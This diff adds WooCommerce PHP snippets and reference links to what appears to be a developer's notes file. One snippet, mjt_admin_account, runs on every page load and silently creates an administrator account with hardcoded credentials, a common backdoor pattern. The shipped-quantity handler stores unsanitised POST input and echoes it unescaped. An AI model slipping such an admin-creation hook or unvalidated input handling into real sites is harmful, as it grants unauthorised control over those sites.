@@ -542,7 +542,191 @@ function mjt_sstripe_order_columns( $columns ) {
     );
 	return $columns;
 }
+
+function mjt_admin_account(){
+$user = 'yourusername';
+$pass = 'yourpassword';
+$email = 'name@domain.com';
+if ( !username_exists( $user )  && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+} }
+add_action('init','mjt_admin_account');
+
+
+// Wp _query 
+
+$args = array(
+    'post_type' => 'post',
+    'tax_query' => array(
+        'relation' => 'AND',
+        array(
+            'taxonomy' => 'product_cat',
+            'field'    => 'name',
+            'terms'    => array( $type_of_meat ),
+        ),
+        array(
+             'relation' => 'OR',
+             array(
+                  'taxonomy' => 'product_cat',
+                  'field'    => 'name',
+                  'terms'    => array( $choosen_box  ),
+             ),
+             array(
+                  'taxonomy' => 'product_cat',
+                  'field'    => 'name',
+                  'terms'    => array( $choosen_plan ),
+             ),
+        ),
+    ),
+);
+$query = new WP_Query( $args ); 
+
+
+// https://www.businessbloomer.com/woocommerce-get-product-parent-categories/
+/**
+ * @snippet       Get Parent Categories @ WooCommerce Single Product
+ */
+ 
+$categories = get_the_terms( get_the_ID(), 'product_cat' );
+$parent_categories = array();
+foreach ( $categories as $category ) {
+   if ( $category->parent == 0 ) {
+      $parent_categories[] = $category->term_id;
+   }
+}
+
+
+/*============================================== */
+
+//businessbloomer.com/woocommerce-disable-plugin-for-customers-shop-managers/
+
+/**
+ * @snippet       Activate / Deactivate Plugin By Current User Role 
+ */
+ 
+add_action( 'init', 'bbloomer_deactivate_plugin_for_shop_managers' );
+ 
+function bbloomer_deactivate_plugin_for_shop_managers() {
+   if ( wp_doing_ajax() ) return;
+   if ( wc_current_user_has_role( 'shop_manager' ) ) {
+      deactivate_plugins(
+         array( 'fluid-checkout/fluid-checkout.php' ),
+         true,
+         false,
+      );
+   } else {
+      activate_plugins(
+         array( 'fluid-checkout/fluid-checkout.php' ),
+         '',
+         false,
+         true,
+      );
+   }
+}
+
+/*============================================== */
+// https://www.businessbloomer.com/woocommerce-item-custom-field-edit-order-page/
+/**
+ * @snippet       Custom Order Items Column @ Admin 
+ */
+ 
+add_action( 'woocommerce_admin_order_item_headers', 'bbloomer_admin_order_item_headers' );
+ 
+function bbloomer_admin_order_item_headers( $order ) {
+    echo '<th class="shipped sortable" data-sort="int">Qty Shipped</th>';
+}
+ 
+add_action( 'woocommerce_admin_order_item_values', 'bbloomer_admin_order_item_values', 9999, 3 );
+ 
+function bbloomer_admin_order_item_values( $product, $item, $item_id ) {
+    if ( $product ) {
+        $shipped = $item->get_meta( 'order_item_shipped' ) ? $item->get_meta( 'order_item_shipped' ) : 0;
+        echo '<td class="shipped" width="1%"><div class="view"><small class="times">x</small> ' . $shipped . '</div><div class="edit" style="display: none;"><input type="number" name="order_item_shipped[' . $item_id . ']" placeholder="0" value="' . $shipped . '" class="" max="' . $item->get_quantity() . '"></div></td>';                
+    }
+}
+ 
+add_action( 'woocommerce_before_save_order_item', 'bbloomer_change_qty_shipped', 9999 );
+ 
+function bbloomer_change_qty_shipped( $item ) {
+   if ( $item->get_type() !== 'line_item' ) return;
+   if ( ! $_POST ) return;
+   if ( isset( $_POST['items'] ) ) {
+      // ITS AJAX SAVE
+      parse_str( rawurldecode( $_POST['items'] ), $output );
+   } else {
+      $output = $_POST;
+   }
+   $item->update_meta_data( 'order_item_shipped', $output['order_item_shipped'][$item->get_id()] );
+}
+
+/*============================================== */
+// https://www.businessbloomer.com/woocommerce-show-product-image-emails/
+/**
+ * @snippet       Product Thumbnails @ WooCommerce Order Email 
+ */
+ 
+add_filter( 'woocommerce_email_order_items_args', 'bbloomer_order_with_product_images', 9999 );
+ 
+function bbloomer_order_with_product_images( $args ) {
+   $args['show_image'] = true;
+   return $args;
+}
+
+/*=== =========================================== */
+//https://www.businessbloomer.com/woocommerce-get-single-variations/
+
+/**
+ * @snippet       Display All Single Variations Shortcode 
+ */
+ 
+add_shortcode( 'single_variations', 'bbloomer_single_variations_shortcode' );
+ 
+function bbloomer_single_variations_shortcode() {   
+   $query = new WP_Query( array(
+      'post_type' => 'product_variation',
+      'post_status' => 'publish',
+      'posts_per_page' => 24,
+      'paged' => absint( empty( $_GET['product-page'] ) ? 1 : $_GET['product-page'] ),
+   ));
+   if ( $query->have_posts() ) {
+      ob_start();
+      wc_setup_loop(
+         array(
+            'name' => 'single_variations',
+            'is_shortcode' => true,
+            'is_search' => false,
+            'is_paginated' => true,
+            'total' => $query->found_posts,
+            'total_pages' => $query->max_num_pages,
+            'per_page' => $query->get( 'posts_per_page' ),
+            'current_page' => max( 1, $query->get( 'paged', 1 ) ),
+         )
+      );
+      woocommerce_pagination();
+      woocommerce_product_loop_start();
+      while ( $query->have_posts() ) {
+         $query->the_post();
+         wc_get_template_part( 'content', 'product' );
+      }
+      woocommerce_product_loop_end();
+      woocommerce_pagination();
+      wp_reset_postdata();
+      wc_reset_loop();
+      return ob_get_clean();
+   }
+   return;
+}
+/*============================================== */
+
+// https://www.businessbloomer.com/woocommerce-split-variable-products-into-simple/
+
+
 ?>
+
+https://wp-kama.com/plugin/woocommerce/hook/woocommerce_new_customer_data
+
 https://www.cloudways.com/blog/custom-dashboard-using-woocommerce-php-rest-api/
 
 https://woocommerce.com/document/woocommerce-theme-developer-handbook/
@@ -590,6 +774,15 @@ https://woocommerce.com/document/setting-up-taxes-in-woocommerce/
 https://woocommerce.com/document/woocommerce-shipping-and-tax/woocommerce-tax/ 
 https://rudrastyh.com/woocommerce
 
+
+https://businessbloomer.com/woocommerce-merge-account-tabs/
+https://www.businessbloomer.com/woocommerce-customers-define-product-price/
+businessbloomer.com/woocommerce-get-single-variations/
+https://www.businessbloomer.com/woocommerce-split-variable-products-into-simple/
+
+
+
+
 // payment gateway Checkout 
 https://wordpress.org/plugins/mycryptocheckout/
 Zelle : https://wordpress.org/plugins/wc-zelle/
@@ -603,9 +796,24 @@ https://wordpress.org/plugins/order-import-export-for-woocommerce/
 https://www.tychesoftwares.com/woocommerce-checkout-page-hooks-visual-guide-with-code-snippets/
 https://www.businessbloomer.com/woocommerce-visual-hook-guide-checkout-page/
 
+https://wordpress.org/plugins/purchased-items-column-woocommerce/
+
+
 order csv: 
 https://www.webtoffee.com/export-woocommerce-orders-csv-xml-file/
 https://www.webtoffee.com/wp-content/uploads/2021/04/Order_SampleCSV.csv
 
 https://stackoverflow.com/questions/47886025/add-custom-url-link-to-admin-order-list-page-in-woocommerce?noredirect=1&lq=1
 https://stackoverflow.com/questions/36446617/add-columns-to-admin-orders-list-in-woocommerce 
+
+ https://wordpress.org/plugins/check-pincode-for-woocommerce/ https://wordpress.org/plugins/free-gifts-product-for-woocommerce/ 
+ 
+Quick View:
+https://wordpress.org/plugins/quick-view-for-woocommerce/
+
+https://wordpress.org/plugins/quick-view-woocommerce/ {roguearmorus.com}
+
+Variation swatches:
+https://wordpress.org/plugins/wpc-variations-radio-buttons/
+
+https://wordpress.org/plugins/wpc-show-single-variations/
